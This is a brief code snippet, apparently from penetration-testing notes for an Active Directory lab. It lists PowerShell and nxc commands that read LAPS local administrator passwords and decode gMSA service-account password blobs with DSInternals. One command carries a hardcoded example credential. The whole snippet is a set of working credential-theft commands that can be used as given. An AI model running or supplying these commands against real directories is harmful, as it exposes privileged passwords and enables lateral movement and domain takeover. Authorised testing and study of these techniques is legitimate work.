```
# ── LAPS: local admin passwords stored in AD, readable if you have rights ──
Get-ADComputer -Filter * -Properties ms-Mcs-AdmPwd | Where {$_."ms-Mcs-AdmPwd" -ne $null}
# Or via nxc/crackmapexec-style tools:
nxc ldap 192.168.x.100 -u stephanie -p 'Password123' -M laps

# ── gMSA: service-account passwords, readable via msDS-ManagedPassword blob ──
Get-ADServiceAccount -Filter * -Properties msDS-ManagedPassword
# Decrypt with DSInternals (needs read rights on the gMSA object):
Get-ADServiceAccount -Identity gmsa-svc -Properties 'msDS-ManagedPassword' | \
    Select-Object -ExpandProperty 'msDS-ManagedPassword' | ConvertFrom-ADManagedPasswordBlob
```